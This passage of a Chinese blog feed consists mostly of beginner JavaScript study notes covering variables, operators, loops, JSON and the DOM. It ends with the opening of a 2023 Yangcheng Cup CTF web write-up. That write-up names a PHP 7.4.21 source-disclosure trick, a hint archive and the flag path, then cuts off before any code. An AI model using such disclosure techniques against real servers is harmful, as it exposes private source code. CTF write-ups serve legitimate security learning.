class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>js学习<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--外部引入--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;test1.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--内部引入--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;hello&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693902331187-c021f6c2-5762-4bfe-876c-d4f8489a5c2c.png" alt="img"></p><h1 id="注释符"><a href="#注释符" class="headerlink" title="注释符:"></a>注释符:</h1><p>与java一一样都是<code>//</code></p><h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><h2 id="定义变量"><a href="#定义变量" class="headerlink" title="定义变量"></a>定义变量</h2><p><code>var 变量名 = 值;</code> 因为是弱类型语言</p><p>除了var之外还有let const 三者区别:</p><ul><li>var声明是全局作用域或函数作用域，而let和const是块作用域。</li><li>var变量可以在其范围内更新和重新声明； let变量可以被更新但不能重新声明； const变量既不能更新也不能重新声明。</li><li>它们都被提升到其作用域的顶端。但是，虽然使用变量undefined初始化了var变量，但未初始化let和const变量。</li><li>尽管可以在不初始化的情况下声明var和let，但是在声明期间必须初始化const。</li></ul><p>来自:<a href="https://www.freecodecamp.org/chinese/news/javascript-var-let-and-const/">JavaScript 中的 Var、Let 和 Const 有什么区别</a></p><p>使用了 var 关键字，它声明的变量是全局的，包括循环体内与循环体外</p><p>使用 let 关键字， 它声明的变量作用域只在循环体内，循环体外的变量不受影响</p><p>就是说如果在循环体外和内都定义相同变量</p><p>那么var不管在体内还是体外都会改变变量值，而let体外的变量值不受体内的改变而变化</p><p> let 关键字声明的全局作用域变量不属于 window 对象</p><h2 id="未定义undefined"><a href="#未定义undefined" class="headerlink" title="未定义undefined"></a>未定义undefined</h2><p>undefined类型只有一个值就是undefined</p><p><code>var a;</code>声明但是没有给值那么就是undefined</p><h2 id="数字number"><a href="#数字number" class="headerlink" title="数字number"></a>数字number</h2><p>数字类型的所有的数字均用浮点数值表示(不区分整数值和浮点值,小数点可带可不带)。<br>特殊的数字类型NaN:<br>NaN 代表非数字的特殊值,用于指示某个值不是数字。<br>NaN 非数字与任何数据都不相等，包括自己。<br>js内置函数isNaN(),判断数值不是数字。<br><code>isNaN(123) //false</code><br><code>isNaN(“abc”) //true</code></p><h2 id="字符串string"><a href="#字符串string" class="headerlink" title="字符串string"></a>字符串string</h2><p>用双引号或者单引号包裹即可</p><p>可以用索引位置来访问其中的每个字符</p><p>内置属性length可以用来计算长度 比如<code>string.length</code></p><p>字符串中包含单双引号时，就需要转义一下，不然无法解析</p><h2 id="字符串还可以是对象"><a href="#字符串还可以是对象" class="headerlink" title="字符串还可以是对象"></a>字符串还可以是对象</h2><p> new 关键字将字符串定义为一个对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var x = &quot;John&quot;;</span><br><span class="line">var y = new String(&quot;John&quot;);</span><br><span class="line">typeof x // 返回 String</span><br><span class="line">typeof y // 返回 Object</span><br></pre></td></tr></table></figure><p>当然String对象最好别用，会拖慢执行速度以及其他副作用</p><h2 id="布尔-boolean"><a href="#布尔-boolean" class="headerlink" title="布尔 boolean"></a>布尔 boolean</h2><p>表示真或者假 只有两个值就是true和false</p><h2 id="对象-object"><a href="#对象-object" class="headerlink" title="对象 object"></a>对象 object</h2><p>对象：是拥有属性和方法的数据<br>语法：<br>var 对象名 &#x3D; <code>&#123;属性名：属性值，属性名：属性值，…&#125;</code><br>对象的属性寻址：<br>对象属性有两种寻址方式也就是引用方式：<br><code>people.name;</code><br><code>people[“name”];</code></p><h2 id="常量"><a href="#常量" class="headerlink" title="常量:"></a>常量:</h2><p><code>const AGE=18;</code> &#x2F;&#x2F;定义常量<br>常量名称常用大写字符<br>常量不能赋值改变，否则会报错</p><h2 id="JS字面量-直接量"><a href="#JS字面量-直接量" class="headerlink" title="JS字面量(直接量)"></a>JS字面量(直接量)</h2><p><strong>用来为变量赋值时的常数量</strong><br>字面量是指程序中直接显示出来的值。<br>100 &#x2F;&#x2F;数字字面量<br>‘hello world’ &#x2F;&#x2F;字符串字面量<br>false &#x2F;&#x2F;布尔字面量<br><code>&#123;x:1, y:2&#125;</code> &#x2F;&#x2F;对象字面量表达式<br><code>[1,2,3,4,5]</code> &#x2F;&#x2F;数组字面量表达式</p><h2 id="js模板字符串"><a href="#js模板字符串" class="headerlink" title="js模板字符串"></a>js模板字符串</h2><p>这里就可以理解为格式化字符串</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694323114599-a0e388c2-4053-4e8c-a00b-0c99c107f1f6.png" alt="img"></p><p>可以将<code>$&#123;&#125;</code>中变量的值带进去一起解析</p><h2 id="变量的使用规则"><a href="#变量的使用规则" class="headerlink" title="变量的使用规则"></a>变量的使用规则</h2><ul><li>变量声明了没有赋值，变量的值就是undefined类型</li><li>变量没有声明直接使用，运行时会报错</li></ul><h1 id="Typeof"><a href="#Typeof" class="headerlink" title="Typeof"></a>Typeof</h1><p>用来监测数据(变量或者值)的数据类型 </p><p>语法：typeof 值</p><p>可以理解为php中的var_dump()函数</p><ol><li>“undefined”——如果这个值未定义；</li><li>“boolean”——如果这个值是布尔值；</li><li>“string”——如果这个值是字符串；</li><li>“number”——如果这个值是数值；</li><li>“object”——如果这个值是对象或null；</li><li>“function”——如果这个值是函数(函数是对象，不是一种数据类型。然而，函数因为有一些特殊的属性，因此通过typeof操作符来区分函数和其他对象)</li></ol><h1 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h1><h2 id="1、算术运算符是用来执行变量或值的算术运算"><a href="#1、算术运算符是用来执行变量或值的算术运算" class="headerlink" title="1、算术运算符是用来执行变量或值的算术运算"></a>1、算术运算符是用来执行变量或值的算术运算</h2><p>++ 自增： x++; &#x2F;&#x2F;相当于x&#x3D;x+1<br>— 自减： x—;&#x2F;&#x2F;相当于x&#x3D;x-1<br>自增或自减的运算符的位置不同，意义不同</p><h2 id="2、赋值运算符是用来给变量赋值"><a href="#2、赋值运算符是用来给变量赋值" class="headerlink" title="2、赋值运算符是用来给变量赋值"></a>2、赋值运算符是用来给变量赋值</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var num=123;</span><br></pre></td></tr></table></figure><h2 id="3、字符串连接符"><a href="#3、字符串连接符" class="headerlink" title="3、字符串连接符"></a>3、字符串连接符</h2><p>实例1：字符串间的 + 运算符<br>字符串间的 + 运算符可以把两个或多个字符串变量连接起来。<br>实例2：对字符串和数字进行加法运算返回字符串。</p><h2 id="4、比较运算符"><a href="#4、比较运算符" class="headerlink" title="4、比较运算符"></a>4、比较运算符</h2><p>比较运算符用来测定变量或值是否相等。<br>返回值为true或false</p><p><code>console.log(null==undefined); //true</code><br><code>console.log(null===undefined); //false</code><br>&#x3D;&#x3D;判断值是否相等；<br>&#x3D;&#x3D;&#x3D;判断值和数据类型是否都相等；</p><p>这一点和php的弱比较和强比较有点像</p><p><code>console.log(isNaN(undefined));// true NaN</code><br><code>console.log(isNaN(null));// false 0</code><br>null是一个表示”空”的对象，转为数值时为0；<br>undefined是一个表示”空”的原始值，转为数值时为NaN。</p><p>特殊的数字类型NaN，用于指示某个值不是数字。<br>NaN 非数字与任何数据都不相等，包括自己。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">NaN==NaN    //false</span><br><span class="line">NaN!=NaN    //true</span><br><span class="line">5 == NaN    //false</span><br><span class="line">&quot;5&quot;==NaN    //false</span><br></pre></td></tr></table></figure><p>在js做比较的时候，有这样的三条规则：<br>如果比较的两者中有bool，会把 bool 先转换为对应的 number，即 0 和 1<br>如果比较的双方中有一方为number一方为string，会把string转换为数字<br>把string直接转换为bool的时候，空字符串<code>&#39;&#39;</code>转换为 false，除此外的一切字符串转换 为 true 总结:先转bool,再转string</p><h1 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h1><p>逻辑运算符用来测定变量和值中的逻辑。<br>逻辑与&amp;&amp;（找假）<br>逻辑或||（找真）<br>逻辑非!<br>返回值为true或false</p><h1 id="JS的三个内置函数"><a href="#JS的三个内置函数" class="headerlink" title="JS的三个内置函数"></a>JS的三个内置函数</h1><ul><li>警告框:alert(“内容”)</li><li>确认框:confirm(“内容”)</li><li>在控制台打印日志:console.log(“日志内容”)</li></ul><h1 id="JS创建对象的两种方式"><a href="#JS创建对象的两种方式" class="headerlink" title="JS创建对象的两种方式"></a>JS创建对象的两种方式</h1><ul><li>使用new关键字创建对象</li><li>使用<code>&#123;&#125;</code>创建对象</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">//使用new关键字创建对象</span><br><span class="line">var obj01=new Object();</span><br><span class="line">obj01.name=&quot;jack&quot;;</span><br><span class="line">obj01.age=100;</span><br><span class="line">obj01.address=&quot;china&quot;;</span><br><span class="line">obj01.showMessage=function()&#123;</span><br><span class="line">    console.log(obj01);</span><br><span class="line">&#125;</span><br><span class="line">//使用&#123;&#125;创建对象</span><br><span class="line">var obj02=&#123;</span><br><span class="line">    &quot;name&quot;:&quot;jack&quot;,</span><br><span class="line">    &quot;age&quot;:20,</span><br><span class="line">    &quot;address&quot;:&quot;china&quot;,</span><br><span class="line">    &quot;showMessage&quot;:function(message)&#123;</span><br><span class="line">        console.log(message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="创建数组"><a href="#创建数组" class="headerlink" title="创建数组"></a>创建数组</h1><ul><li>使用new关键字创建数组：<code>var arr = new Array();</code>感觉像是php内置类 有木有？？</li><li>使用<code>[]</code>创建数组: <code>var arr = [&quot;cat&quot;,&quot;dog&quot;];</code></li></ul><h2 id="数组常用方法"><a href="#数组常用方法" class="headerlink" title="数组常用方法"></a>数组常用方法</h2><ul><li>压入数据：<code>arr01.push(“apple”);</code></li><li>数组元素反转：<code>arr01.reverse( );</code></li><li>把数组元素通过指定的分隔符，拼接成字符串：<code>var arrStr = arr01.join(“,”);</code></li><li>把字符串通过指定的分隔符，拆分成数组：<code>var arr02 = arrStr.split(“,”);</code></li><li>弹出数组中最后一个元素 ：将数组最后一个元素移除，并返回：<code>var ele = arr01.pop( );</code></li><li>遍历数组：<code>for (var i = 0; i &lt; arr01.length; i++) &#123; console.log(arr01[i]); &#125;</code></li></ul><h1 id="this关键字"><a href="#this关键字" class="headerlink" title="this关键字"></a>this关键字</h1><ul><li>在函数外面：this关键字指向window对象也就是代表当前浏览器窗口</li><li>在函数里面：this关键字指向调用函数的对象</li></ul><p>会随着执行环境而改变：</p><ul><li>在方法中，this 表示该方法所属的对象。</li><li>如果单独使用，this 表示全局对象。</li><li>在函数中，this 表示全局对象。</li><li>在函数中，在严格模式下，this 是未定义的(undefined)。</li><li>在事件中，this 表示接收事件的元素。</li><li>类似 call() 和 apply() 方法可以将 this 引用到任何对象</li></ul><h1 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h1><p>和其他语言差不多</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">第一种</span><br><span class="line">if (condition)</span><br><span class="line">&#123;</span><br><span class="line">    当条件为 true 时执行的代码</span><br><span class="line">&#125;</span><br><span class="line">第二种</span><br><span class="line">if (condition)</span><br><span class="line">&#123;</span><br><span class="line">    当条件为 true 时执行的代码</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    当条件不为 true 时执行的代码</span><br><span class="line">&#125;</span><br><span class="line">第三种</span><br><span class="line">if (condition1)</span><br><span class="line">&#123;</span><br><span class="line">    当条件 1 为 true 时执行的代码</span><br><span class="line">&#125;</span><br><span class="line">else if (condition2)</span><br><span class="line">&#123;</span><br><span class="line">    当条件 2 为 true 时执行的代码</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">  当条件 1 和 条件 2 都不为 true 时执行的代码</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="SWITCH语句"><a href="#SWITCH语句" class="headerlink" title="SWITCH语句"></a>SWITCH语句</h1><p>也和其他语言一样 条件等于相应的值时 执行语句</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">switch(n)</span><br><span class="line">&#123;</span><br><span class="line">    case 1:</span><br><span class="line">        执行代码块 1</span><br><span class="line">        break;</span><br><span class="line">    case 2:</span><br><span class="line">        执行代码块 2</span><br><span class="line">        break;</span><br><span class="line">    default:</span><br><span class="line">        与 case 1 和 case 2 不同时执行的代码</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有一个小点就是<code>case(条件)</code>这里条件中的等号是强等于 不仅比较值也要比较类型</p><h2 id="default"><a href="#default" class="headerlink" title="default"></a>default</h2><p>也就是当以上条件都不执行时，就执行该default下的语句</p><h1 id="JS类型转换"><a href="#JS类型转换" class="headerlink" title="JS类型转换"></a>JS类型转换</h1><h2 id="constructor属性"><a href="#constructor属性" class="headerlink" title="constructor属性"></a>constructor属性</h2><p>constructor 属性返回所有 JavaScript 变量的构造函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&quot;John&quot;.constructor                 // 返回函数 String()  &#123; [native code] &#125;</span><br><span class="line">(3.14).constructor                 // 返回函数 Number()  &#123; [native code] &#125;</span><br><span class="line">false.constructor                  // 返回函数 Boolean() &#123; [native code] &#125;</span><br><span class="line">[1,2,3,4].constructor              // 返回函数 Array()   &#123; [native code] &#125;</span><br><span class="line">&#123;name:&#x27;John&#x27;, age:34&#125;.constructor  // 返回函数 Object()  &#123; [native code] &#125;</span><br><span class="line">new Date().constructor             // 返回函数 Date()    &#123; [native code] &#125;</span><br><span class="line">function () &#123;&#125;.constructor         // 返回函数 Function()&#123; [native code] &#125;</span><br></pre></td></tr></table></figure><p>类型转换比如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var a=123</span><br><span class="line">String(a) </span><br><span class="line">a就被转为字符串类型了</span><br></pre></td></tr></table></figure><h1 id="For循环"><a href="#For循环" class="headerlink" title="For循环"></a>For循环</h1><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for (语句 1; 语句 2; 语句 3)</span><br><span class="line">&#123;</span><br><span class="line">    被执行的代码块</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>eg：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for (var i=0; i&lt;5; i++)</span><br><span class="line">&#123;</span><br><span class="line">      x=x + &quot;该数字为 &quot; + i + &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h1><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">while (条件)</span><br><span class="line">&#123;</span><br><span class="line">    需要执行的代码</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="do-while循环"><a href="#do-while循环" class="headerlink" title="do-while循环"></a>do-while循环</h2><p>该循环会在检查条件是否为真之前执行一次代码块，然后如果条件为真的话，就会重复这个循环。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">do</span><br><span class="line">&#123;</span><br><span class="line">    需要执行的代码</span><br><span class="line">&#125;</span><br><span class="line">while (条件);</span><br></pre></td></tr></table></figure><h1 id="break和continue语句"><a href="#break和continue语句" class="headerlink" title="break和continue语句"></a>break和continue语句</h1><p>简单说就是break跳出整个循环</p><p>continue跳出此次循环然后继续下个循环</p><h1 id="js错误-throw、try、catch"><a href="#js错误-throw、try、catch" class="headerlink" title="js错误-throw、try、catch"></a>js错误-throw、try、catch</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">try 语句测试代码块的错误</span><br><span class="line">catch 语句处理错误</span><br><span class="line">throw 语句创建自定义错误</span><br><span class="line">finally 语句在 try 和 catch 语句之后，无论是否有触发异常，该语句都会执行</span><br></pre></td></tr></table></figure><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">    ...    //异常的抛出</span><br><span class="line">&#125; catch(e) &#123;</span><br><span class="line">    ...    //异常的捕获与处理</span><br><span class="line">&#125; finally &#123;</span><br><span class="line">    ...    //结束处理</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>throw放在try下语句，那么能够控制程序流，并生成自定义的错误消息</p><h1 id="JS声明提升"><a href="#JS声明提升" class="headerlink" title="JS声明提升"></a>JS声明提升</h1><p>声明提升：函数声明和变量声明总是会被解释器悄悄地被”提升”到方法体的最顶部。</p><p>函数及变量的声明都将被提升到函数的最顶部</p><p>变量可以在使用后声明，也就是变量可以先使用再声明 </p><p>只有声明的变量会提升，初始化的不会</p><p>这里需要理解什么是声明 什么是初始化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var x; #这是声明</span><br><span class="line">var y=10; #这是初始化</span><br><span class="line">也就是说单纯定义变量是声明 定义并且赋值就是初始化了</span><br></pre></td></tr></table></figure><h1 id="JS严格模式"><a href="#JS严格模式" class="headerlink" title="JS严格模式"></a>JS严格模式</h1><p>严格模式通过在脚本或函数的头部添加 <code>use strict;</code> 表达式来声明。</p><p>为什么使用严格模式:</p><p>消除Javascript语法的一些不合理、不严谨之处，减少一些怪异行为;</p><ul><li>消除代码运行的一些不安全之处，保证代码运行的安全；</li><li>提高编译器效率，增加运行速度；</li><li>为未来新版本的Javascript做好铺垫。</li></ul><p>“严格模式”体现了Javascript更合理、更安全、更严谨的发展方向，包括IE 10在内的主流浏览器，都已经支持它，许多大项目已经开始全面拥抱它。</p><p>另一方面，同样的代码，在”严格模式”中，可能会有不一样的运行结果</p><p>严格模式限制：</p><ul><li>不容许使用未声明的变量</li><li>不容许删除变量或对象</li><li>不容许删除函数</li><li>不容许变量重名</li><li>不容许使用八进制</li><li>不容许使用转义字符</li><li>不容许对只读属性赋值</li><li>不容许对一个使用getter方法读取的属性进行赋值</li><li>不容许删除一个不容许删除的属性</li><li>变量名不能使用<code>&#39;eval，arguments&#39;</code>字符串</li><li>不容许使用这种语句<code>&quot;use strict&quot;;with (Math)&#123;x = cos(2)&#125;;// 报错 </code></li><li>由于一些安全原因，在作用域 eval() 创建的变量不能被调用</li><li>禁止this关键字指向全局对象</li></ul><h1 id="JSON数据"><a href="#JSON数据" class="headerlink" title="JSON数据"></a>JSON数据</h1><ul><li>JSON数据的本质是一个有规则、可以解析的字符串</li><li>JSON数据在js中就是一个对象</li></ul><h2 id="JSON格式："><a href="#JSON格式：" class="headerlink" title="JSON格式："></a>JSON格式：</h2><ul><li><code>&#123;&#125;</code>:定义JSON对象</li><li><code>[]</code>：定义JSON数据</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var json01 = &#123; &quot;name&quot;:&quot;三国演义&quot;, &quot;price&quot;:55.55, &quot;version&quot;:&quot;三国演义version01&quot; &#125;;</span><br><span class="line">var json02 = &#123; &quot;name&quot;:&quot;红楼梦&quot;, &quot;price&quot;:99.99, &quot;version&quot;:&quot;红楼梦version01&quot; &#125;;</span><br><span class="line">var json03 = &#123; &quot;name&quot;:&quot;西游记&quot;, &quot;price&quot;:66.65, &quot;version&quot;:&quot;西游记version01&quot; &#125;;</span><br><span class="line">var jsonList=[</span><br><span class="line">        json01,</span><br><span class="line">        json02,</span><br><span class="line">        json03,</span><br><span class="line">        &#123;&quot;name&quot;:&quot;水浒传&quot;,&quot;price&quot;:0.00,&quot;version&quot;:&quot;null&quot;&#125;</span><br><span class="line">    ];</span><br></pre></td></tr></table></figure><h2 id="JSON对象和JSON字符串互转"><a href="#JSON对象和JSON字符串互转" class="headerlink" title="JSON对象和JSON字符串互转"></a>JSON对象和JSON字符串互转</h2><ul><li>JSON.stringify( )：JSON对象转JSON字符串</li><li>JSON.parse( )：JSON字符串转JSON对象</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var jsonObj = &#123;&quot;stuName&quot;:&quot;tom&quot;,&quot;stuAge&quot;:20&#125;;</span><br><span class="line">var jsonStr = JSON.stringify(jsonObj);</span><br><span class="line">console.log(typeof jsonObj); // object</span><br><span class="line">console.log(typeof jsonStr); // string</span><br><span class="line">var json=JSON.parse(jsonStr);</span><br><span class="line">console.log(typeof json); // object</span><br></pre></td></tr></table></figure><h1 id="向未声明的-JavaScript-变量分配值"><a href="#向未声明的-JavaScript-变量分配值" class="headerlink" title="向未声明的 JavaScript 变量分配值"></a>向未声明的 JavaScript 变量分配值</h1><p>如果把值赋给尚未声明的变量，该变量将被自动作为 window 的一个属性。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">carname=&quot;Volvo&quot;;</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694274282232-728d187d-e1bb-4900-9fd3-d9ef8f94c90c.png" alt="img"></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694274292688-feaec007-0744-4bda-ba1e-33668a514ac3.png" alt="img"></p><h1 id="JavaScript-事件"><a href="#JavaScript-事件" class="headerlink" title="JavaScript 事件"></a>JavaScript 事件</h1><p>HTML 事件是发生在 HTML 元素上的事情。</p><p>当在 HTML 页面中使用 JavaScript 时， JavaScript 可以触发这些事件。</p><h2 id="常见HTML事件列表："><a href="#常见HTML事件列表：" class="headerlink" title="常见HTML事件列表："></a>常见HTML事件列表：</h2><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694322511181-6d2ae76b-5770-4457-8119-23c806db8f59.png" alt="img"></p><h1 id="DOM文档对象模型"><a href="#DOM文档对象模型" class="headerlink" title="DOM文档对象模型"></a>DOM文档对象模型</h1><p>JavaScript 语句是发给浏览器的命令。</p><p>这些命令的作用是告诉浏览器要做的事情。</p><ul><li>document对象：代表整个页面的对象，可以直接使用的内置对象</li><li>DOM的作用是使用JS代码操作HTML页面的标签和内容</li></ul><h1 id="DOM树"><a href="#DOM树" class="headerlink" title="DOM树"></a>DOM树</h1><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693906043115-cddd2244-3b38-4f4a-8043-055aaea864bf.png" alt="img"></p><p>均学习于：</p><p><a href="https://www.runoob.com/js/js-htmldom.html">https://www.runoob.com/js/js-htmldom.html</a></p><p><a href="https://www.kuangstudy.com/bbs/1571499157607657474">https://www.kuangstudy.com/bbs/1571499157607657474</a></p><p><a href="https://www.kuangstudy.com/bbs/1679494100476669953">https://www.kuangstudy.com/bbs/1679494100476669953</a></p>]]></content>
      
      
      <categories>
          
          <category> 知识学习 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2023羊城杯WEB WP与复现学习</title>
      <link href="/post/3edff1a9.html"/>
      <url>/post/3edff1a9.html</url>
      
        <content type="html"><![CDATA[<p>2023羊城杯WEB WP与复现学习</p><span id="more"></span><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="D0n’t-pl4y-g4m3"><a href="#D0n’t-pl4y-g4m3" class="headerlink" title="D0n’t pl4y g4m3!!!"></a>D0n’t pl4y g4m3!!!</h2><p>php 7.4.21源码泄露  之前东北电力大学举办的一个ctf比赛上出过类似题目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/hint.zip</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693623290570-7868b5b7-d2cd-4183-88c1-b7af0b623684.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag在/tmp/catcatf1ag.txt</span><br></pre></td></tr></table></figure><p>然后用源码泄露p0p.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span 